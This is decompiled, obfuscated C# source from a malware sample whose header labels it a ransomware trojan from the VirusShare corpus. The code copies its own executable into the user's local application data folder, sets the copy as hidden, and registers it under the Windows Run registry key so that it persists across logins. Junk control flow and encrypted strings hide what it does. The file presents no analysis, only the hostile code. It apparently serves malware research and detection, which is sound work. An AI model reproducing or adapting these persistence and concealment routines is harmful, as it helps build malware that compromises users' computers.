// Decompiled with JetBrains decompiler
// Type: browser_bastan.Araclar
// Assembly: WindowsDNS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0480E4CF-8681-4A86-8A4E-F3A7EB47B98C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-9114126ef92c30466a9dd55998cf1923053e80914e03714e2c0d5bc8826e6204.exe

using eJnHnFFEpEmlCQmkVB;
using eYO1TM7iGlKLL86lCw;
using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace browser_bastan
{
  public class Araclar
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static string Regkeyname;
    public static string DstName;

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DisableClickSounds() => Araclar.CoInternetSetFeatureEnabled(21, 2, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Copy(string src, string dst)
    {
      Araclar.G4WPTcFtNb90jydCUQh();
      int num1;
      if (Araclar.fG8FIiFOFRBlXKfqnKV())
        num1 = 4;
      else
        goto label_4;
label_3:
      switch (num1)
      {
        case 0:
        case 4:
          goto label_5;
        case 1:
          Araclar.ALvqvdF2ejNkkP0EvjX((object) dst, FileAttributes.Normal);
          goto label_7;
        case 5:
          return;
        default:
          goto label_7;
      }
label_4:
      num1 = 3;
      if (Araclar.fG8FIiFOFRBlXKfqnKV())
        goto label_3;
label_5:
      if (Araclar.yo4tPIFhLqsTXyROrHr((object) dst))
      {
        num1 = 1;
        goto label_3;
      }
label_7:
      try
      {
        Araclar.LlxjdMFfeLBMZYjCsUU((object) src, (object) dst, true);
      }
      catch (Exception ex)
      {
      }
      Araclar.ALvqvdF2ejNkkP0EvjX((object) dst, FileAttributes.Hidden);
      int num2 = 5;
      num1 = Araclar.G4WPTcFtNb90jydCUQh() ? num2 : num2;
      goto label_3;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Startup(string name, string path)
    {
      int num;
      if (Araclar.fG8FIiFOFRBlXKfqnKV())
      {
        if (!Araclar.G4WPTcFtNb90jydCUQh())
        {
          num = 2;
          goto label_6;
        }
      }
      else
        goto label_7;
label_2:
      RegistryKey registryKey;
      Araclar.qAjfOCFI3yxqPRs3vjS((object) registryKey);
      if (false)
        return;
      num = 6;
label_6:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            registryKey = (RegistryKey) Araclar.NDFNviFbHH1EZrAPttk((object) Registry.CurrentUser, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1824), true);
            num = 5;
            continue;
          case 1:
            goto label_11;
          case 5:
            if (registryKey == null)
            {
              num = 1;
              continue;
            }
            goto label_5;
          case 6:
            goto label_4;
          default:
            goto label_2;
        }
      }
label_5:
      Araclar.anMAPTF65Sn5d372Xcb((object) registryKey, (object) name, (object) path);
      goto label_2;
label_4:
      return;
label_11:
      return;
label_7:
      num = 4;
      goto label_6;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DstCheck()
    {
      int num = 0;
      string str1;
      string str2;
      while (true)
      {
        switch (num)
        {
          case 0:
            str1 = (string) Araclar.mlxsNNFSpsDqc73QAnp(Araclar.zdRZZJFy9j4RNVXACDd());
            Araclar.fG8FIiFOFRBlXKfqnKV();
            num = Araclar.G4WPTcFtNb90jydCUQh() ? 3 : 4;
            continue;
          case 1:
          case 4:
            str2 = (string) Araclar.GCUlEKFpRGWHlYgXW1L(Environment.SpecialFolder.LocalApplicationData);
            goto case 2;
          case 2:
          case 3:
            if (!Araclar.uTHlYxFAOiv7WXZ0dWt(Araclar.BF6DWlFPEdfhUdORP9C((object) str1), (object) str2))
            {
              Araclar.VWovAsFoF3XCgkq1pK5((object) str1, Araclar.GphtPCFr5ZRPmHCHpCn((object) str2, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1918), (object) Araclar.DstName));
              num = 6;
              continue;
            }
            goto label_5;
          case 5:
            goto label_9;
          case 6:
            goto label_2;
          default:
            if (Araclar.fG8FIiFOFRBlXKfqnKV())
            {
              num = 5;
              continue;
            }
            goto case 1;
        }
      }
label_5:
      return;
label_2:
      return;
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Araclar()
    {
      Araclar.pq3AyWFKJIvFmx66D9E();
      Araclar.BxEqmOFzk9i7Zf3XlN5((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Araclar()
    {
      int num = !Araclar.fG8FIiFOFRBlXKfqnKV() ? 2 : 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            Araclar.pq3AyWFKJIvFmx66D9E();
            goto case 1;
          case 1:
          case 2:
            Araclar.Regkeyname = empvh6dZSo5pSUG8BZ.eF0YZf0gO(1924);
            goto case 4;
          case 4:
            Araclar.DstName = empvh6dZSo5pSUG8BZ.eF0YZf0gO(1948);
            num = 5;
            continue;
          case 5:
            goto label_6;
          default:
            num = 4;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool fG8FIiFOFRBlXKfqnKV() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool G4WPTcFtNb90jydCUQh() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool yo4tPIFhLqsTXyROrHr([In] object obj0) => File.Exists((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void ALvqvdF2ejNkkP0EvjX([In] object obj0, [In] FileAttributes obj1) => File.SetAttributes((string) obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void LlxjdMFfeLBMZYjCsUU([In] object obj0, [In] object obj1, [In] bool obj2) => File.Copy((string) obj0, (string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object NDFNviFbHH1EZrAPttk([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void anMAPTF65Sn5d372Xcb([In] object obj0, [In] object obj1, [In] object obj2) => ((RegistryKey) obj0).SetValue((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void qAjfOCFI3yxqPRs3vjS([In] object obj0) => ((RegistryKey) obj0).Close();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object zdRZZJFy9j4RNVXACDd() => (object) Assembly.GetExecutingAssembly();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object mlxsNNFSpsDqc73QAnp([In] object obj0) => (object) ((Assembly) obj0).Location;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object GCUlEKFpRGWHlYgXW1L([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object BF6DWlFPEdfhUdORP9C([In] object obj0) => (object) Path.GetDirectoryName((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool uTHlYxFAOiv7WXZ0dWt([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object GphtPCFr5ZRPmHCHpCn([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void VWovAsFoF3XCgkq1pK5([In] object obj0, [In] object obj1) => Araclar.Copy((string) obj0, (string) obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void pq3AyWFKJIvFmx66D9E() => eWK97ZHZd8El3E8K9m.YgtHbqizk7dGt();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void BxEqmOFzk9i7Zf3XlN5([In] object obj0) => obj0.\u002Ector();
  }
}
